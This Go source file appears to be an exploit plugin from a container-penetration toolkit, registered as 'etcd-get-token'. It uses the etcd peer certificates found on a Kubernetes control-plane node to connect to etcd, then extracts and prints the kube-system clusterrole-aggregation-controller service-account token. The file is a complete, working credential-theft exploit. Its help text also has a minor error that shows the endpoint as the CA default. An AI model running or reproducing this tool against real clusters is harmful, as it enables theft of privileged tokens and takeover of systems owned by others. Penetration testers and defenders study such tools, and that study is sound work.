package exploit

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"regexp"
	"strings"

	"github.com/cdk-team/CDK/pkg/cli"
	"github.com/cdk-team/CDK/pkg/plugin"
	"go.etcd.io/etcd/clientv3"
)

const (
	defaultEtcdCert    = "/etc/kubernetes/pki/etcd/peer.crt"
	defaultEtcdCertKey = "/etc/kubernetes/pki/etcd/peer.key"
	defaultEtcdCa      = "/etc/kubernetes/pki/etcd/ca.crt"
	defaultEndpoint    = "127.0.0.1:2379"
)

// plugin interface
type EtcdGetToken struct{}

func (p EtcdGetToken) Desc() string {
	var buffer strings.Builder

	buffer.WriteString("Connect to etcd and get token of k8s. ")
	buffer.WriteString("The First argument is endpoint of etcd (default: %s), ")
	buffer.WriteString("the second is etcd cert (default: %s), ")
	buffer.WriteString("the third is etcd cert key (default: %s), ")
	buffer.WriteString("the last is etcd ca (default: %s). ")

	return fmt.Sprintf(
		buffer.String(),
		defaultEndpoint,
		defaultEtcdCert,
		defaultEtcdCertKey,
		defaultEndpoint,
	)
}
func (p EtcdGetToken) Run() bool {

	args := cli.Args["<args>"].([]string)

	var (
		etcdCert    = defaultEtcdCert
		etcdCertKey = defaultEtcdCertKey
		etcdCa      = defaultEtcdCa
		endpoint    = defaultEndpoint
	)

	switch len(args) {
	case 0:
	case 1:
		endpoint = args[0]
	case 2:
		endpoint = args[0]
		etcdCert = args[1]
	case 3:
		endpoint = args[0]
		etcdCert = args[1]
		etcdCertKey = args[2]
	default:
		endpoint = args[0]
		etcdCert = args[1]
		etcdCertKey = args[2]
		etcdCa = args[3]
	}

	cert, err := tls.LoadX509KeyPair(etcdCert, etcdCertKey)
	if err != nil {
		fmt.Printf("\n[etcd-get-token] run failed\n")
		fmt.Println(err)
		return false
	}

	caData, err := ioutil.ReadFile(etcdCa)
	if err != nil {
		fmt.Printf("\n[etcd-get-token] run failed\n")
		fmt.Println(err)
		return false
	}

	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(caData)

	endpoints := []string{endpoint}
	client3, err := clientv3.New(
		clientv3.Config{
			Endpoints: endpoints,
			TLS: &tls.Config{
				Certificates: []tls.Certificate{cert},
				RootCAs:      pool,
			},
		},
	)
	if err != nil {
		fmt.Printf("\n[etcd-get-token] run failed\n")
		fmt.Println(err)
		return false
	}

	getAll, err := client3.Get(context.TODO(), "/registry/secrets/kube-system/clusterrole-aggregation-controller-token", clientv3.WithPrefix())
	if err != nil {
		fmt.Printf("\n[etcd-get-token] run failed\n")
		fmt.Println(err)
		return false
	}
	for _, kv := range getAll.Kvs {
		re, _ := regexp.Compile("token.*service-account-token")
		result := re.FindString(string(kv.Value))

		fmt.Printf("\n[etcd-get-token] run success\n")
		fmt.Println(result)
		return true
	}
	return false
}

func init() {
	exploit := EtcdGetToken{}
	plugin.RegisterExploit("etcd-get-token", exploit)
}
